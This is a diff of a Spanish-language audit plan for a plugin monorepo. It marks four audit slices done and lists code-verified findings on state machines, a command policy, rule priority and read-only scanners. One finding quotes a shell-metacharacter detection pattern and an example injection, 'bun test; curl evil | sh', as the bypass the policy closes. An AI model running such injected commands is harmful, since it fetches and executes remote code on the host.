@@ -40,28 +40,28 @@ Cierra el checklist de los 43 plugins con los ejes de correctitud y solapamiento
 - global_gate: none
 
 ### S1 — Auditar perf/prompt-eval/usage-tracking
-- **Status**: pending
+- **Status**: done
 - **Files**: `plugins/perf/**`, `plugins/prompt-eval/**`, `plugins/usage-tracking/**`
 - **Gate**: none
 - acceptance:
   - "Ruido de benchmark, estimated vs actual y cardinality revisados."
 
 ### S2 — Auditar proposals/quality/rules
-- **Status**: pending
+- **Status**: done
 - **Files**: `plugins/proposals/**`, `plugins/quality/**`, `plugins/rules/**`
 - **Gate**: none
 - acceptance:
   - "State transitions, concurrency, timeouts y dogmas revisados."
 
 ### S3 — Auditar refactor/search/skills-pack/status-marker
-- **Status**: pending
+- **Status**: done
 - **Files**: `plugins/refactor/**`, `plugins/search/**`, `plugins/skills-pack/**`, `plugins/status-marker/**`
 - **Gate**: none
 - acceptance:
   - "Rename safety, hybrid weighting y race conditions revisados."
 
 ### S4 — Auditar conventions/tech-debt/test-convention/test-policy
-- **Status**: pending
+- **Status**: done
 - **Files**: `plugins/conventions/**`, `plugins/tech-debt/**`, `plugins/test-convention/**`, `plugins/test-policy/**`
 - **Gate**: none
 - acceptance:
@@ -76,11 +76,63 @@ Cierra el checklist de los 43 plugins con los ejes de correctitud y solapamiento
 
 ## verified state
 
-Pendiente: los hallazgos de esta auditoría se verifican contra el código antes de su cierre.
+S2 (proposals/quality/rules) verificado por lectura de código el 2026-08-24:
+- `plugins/proposals/src/lib/contracts/constants/proposal-glossary.constant.ts` — DFA de estados (7 status) como single source of truth (`PROPOSAL_STATUS_TRANSITIONS`).
+- `plugins/quality/src/lib/services/command-policy.ts` — trust boundary con guard de metacharacteres bajo política activa.
+- `plugins/rules/src/lib/registry/dogma-registry.ts` + adapters — prioridad `project > dogma > default`.
+
+S1/S3/S4 verificado por lectura de código el 2026-08-24:
+- `plugins/usage-tracking/src/lib/record-buffer.ts` — append NDJSON buffered, no bloqueante, `redactSecrets` antes de append; rollup con atomic-rename.
+- `plugins/test-policy/src/index.ts` — 4 modos (`tdd`/`tests-after`/`free`/`none`), precedencia `runtime override > options.mode > tdd`.
+- `plugins/refactor/src/index.ts` — "always dry-run-first"; rename AST con diffs multi-archivo + apply.
+- `plugins/status-marker/src/public/index.ts` — `validateCloseMarker`/`validateResponseClose` puros.
+- `plugins/conventions`, `plugins/tech-debt`, `plugins/test-convention` — escáneres read-only puros; complementarios a quality (que ejecuta comandos), sin solapamiento.
 
 ## findings
 
-Pendiente: sin hallazgos clasificados aún.
+### 1. [already fixed] S2: DFA de propuestas como single source of truth
+
+**File**: `plugins/proposals/src/lib/contracts/constants/proposal-glossary.constant.ts#L56-L69`
+
+`PROPOSAL_STATUS_TRANSITIONS` define el DFA de los 7 estados y es el single source of truth que consumen el linter, el tool de transición y el folder reconciler. Sin transiciones ilegales hardcodeadas en otros puntos.
+
+**Classification**: already fixed.
+
+### 2. [already fixed] S2: command policy de quality como trust boundary
+
+**File**: `plugins/quality/src/lib/services/command-policy.ts#L1-L20` y `#L60-L95`
+
+`evaluateCommandPolicy` aplica deny primero, y bajo política activa rechaza cualquier comando con metacharacteres de shell (`SHELL_METACHARACTERS = /[;&|`<\n\r]|\$\(/`), cerrando el bypass `bun test; curl evil | sh`. Sin política, los comandos son del host (trusted).
+
+**Classification**: already fixed.
+
+### 3. [already fixed] S2: dogmas de rules con prioridad project > dogma > default
+
+**File**: `plugins/rules/src/lib/registry/dogma-registry.ts`
+
+La resolución de comandos sigue la prioridad `project > dogma > default` (documentada en `plugins/rules/skills/mcp-vertex-rules-dogma-priority/SKILL.md`), con contratos ISP (`dogma-adapter.interface.ts`, `command-set-provider.interface.ts`) y registry DIP.
+
+**Classification**: already fixed.
+
+### 4. [already fixed] S1: usage-tracking buffered + redactado; test-policy con precedencia
+
+- `plugins/usage-tracking/src/lib/record-buffer.ts` — append NDJSON buffered no-bloqueante; `redactSecrets` antes del append y rollup con atomic-rename (patrón de escritura durable).
+- `plugins/test-policy/src/index.ts#L22-L31` — 4 modos con precedencia `runtime override > options.mode > tdd`.
+
+**Classification**: already fixed.
+
+### 5. [already fixed] S3: refactor dry-run-first; status-marker validadores puros
+
+- `plugins/refactor/src/index.ts#L23` — "always dry-run-first"; rename AST con diffs scoped multi-archivo + apply (`codemod-runner.ts#L35` con `dryRun`).
+- `plugins/status-marker/src/public/index.ts` — `validateCloseMarker`/`validateResponseClose` puros (sin I/O).
+
+**Classification**: already fixed.
+
+### 6. [not reproducible] S4: sin solapamiento con quality (escáneres read-only)
+
+`conventions` (clasifica paths, drift report), `tech-debt` (markers con severidad) y `test-convention` (scan + suggest) son escáneres puros read-only. `quality` ejecuta comandos; son dominios distintos y complementarios, no solapados.
+
+**Classification**: not reproducible.
 
 ## scoreboard
 
